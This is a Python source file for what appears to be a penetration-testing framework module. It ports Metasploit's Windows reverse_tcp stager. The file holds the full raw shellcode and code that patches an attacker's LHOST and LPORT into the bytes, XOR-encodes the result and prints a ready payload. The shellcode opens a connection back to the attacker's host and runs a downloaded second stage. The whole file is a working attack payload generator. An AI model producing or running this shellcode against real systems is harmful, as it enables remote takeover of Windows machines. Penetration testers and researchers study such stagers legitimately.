# This is the reverse_tcp payload, completely ported from the Metasploit
# Framework.
# https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/windows/reverse_tcp.rb

import binascii
import socket
from lib.ple.tools.shell.encode.xor import *
from lib.ple.tools.lib.payloads.shellcode import * 


class Payload(Shellcode):
    
    Shellcode.info["author"] = "mosin"
    Shellcode.info["name"] = "Windows - reverse_tcp shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com/exploits/37758/"
    ]
    
    def __init__(self, **kwargs):
        super(self.__class__, self).__init__()
        self.stager = (
            "\xFC\xE8\x86\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
            "\x8B\x52\x10\x8B\x42\x3C\x8B\x4C\x10\x78\xE3\x4A\x01\xD1\x51\x8B" +
            "\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3C\x49\x8B\x34\x8B\x01\xD6\x31" +
            "\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8" +
            "\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B" +
            "\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61" +
            "\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x89\x5D\x68\x33\x32" +
            "\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8" +
            "\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x50" +
            "\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A" +
            "\x05\x68\x7F\x00\x00\x01\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56" +
            "\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E\x08\x75" +
            "\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57\x68\x02" +
            "\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A" +
            "\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68" +
            "\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3")
            
        self.register_option({
            "LHOST": {
                "default": "",
                "desc": " LHOST",
                "Required":"no"
           		 },
            "LPORT":{
                "default": 4444,
                "desc": " LPORT",
                "Required":"no"
            		}
       		 })


    def sld(self):
        lport = self.options.LPORT['default']
        lhost = self.options.LHOST['default']
        retries_offset = 192
        lhost_offset = 194
        lport_offset = 201
        exitfunc_offset = 226
        customized_shellcode = ''
        # Take the passed in attributes and gen shellcode
        ip_shellcode = ''
        n = 2
        ip_shellcode_stage = binascii.hexlify(socket.inet_aton(lhost))
        ip_shellcode_stage = [ip_shellcode_stage[i:i + n] for i in range(0, len(ip_shellcode_stage), n)]
        for two_bytes in ip_shellcode_stage:
            ip_shellcode += '\\x' + two_bytes

        # convert port to shellcode
        port_shellcode_stage = str(hex(lport).lstrip('0'))
        if len(port_shellcode_stage.lstrip('x')) == 3:
            # detect if odd number, is so, need to add a '0' to the front
            port_1half = '0' + port_shellcode_stage[0:2].lstrip('x')
            port_1half = '\\x' + port_1half
            port_2half = port_shellcode_stage[2:4]
            port_2half = '\\x' + port_2half
            port_shellcode = port_1half + port_2half
        elif len(port_shellcode_stage.lstrip('x')) == 4:
            port_1half = port_shellcode_stage[1:3]
            port_1half = '\\x' + port_1half
            port_2half = port_shellcode_stage[3:5]
            port_2half = '\\x' + port_2half
            port_shellcode = port_1half + port_2half
        elif len(port_shellcode_stage.lstrip('x')) == 2:
            port_1half = port_shellcode_stage[1:3].lstrip('x')
            port_1half = '\\x' + port_1half
            port_2half = '00'
            port_2half = '\\x' + port_2half
            port_shellcode = port_2half + port_1half
        elif len(port_shellcode_stage.lstrip('x')) == 1:
            port_1half = port_shellcode_stage.lstrip('x')
            port_1half = '\\x0' + port_1half
            port_2half = '\\x00'
            port_shellcode = port_2half + port_1half

        retries = '\x09'

        stager_shellcode = self.stager[0:retries_offset]
        stager_shellcode += retries
        stager_shellcode += self.stager[retries_offset + 1:lhost_offset]
        stager_shellcode += ip_shellcode.decode('string-escape')
        stager_shellcode += self.stager[lhost_offset + 4:lport_offset]
        stager_shellcode += port_shellcode.decode('string-escape')
        stager_shellcode += self.stager[lport_offset + 2:]
        customized_shellcode = "\\x" + '\\x'.join(stager_shellcode.encode('hex')[i:i + 2] for i in range(0, len(stager_shellcode.encode('hex')), 2))
        Shellcode.info["payload"] = EncoderModule(customized_shellcode).do_the_magic()
        print Shellcode.info["payload"]


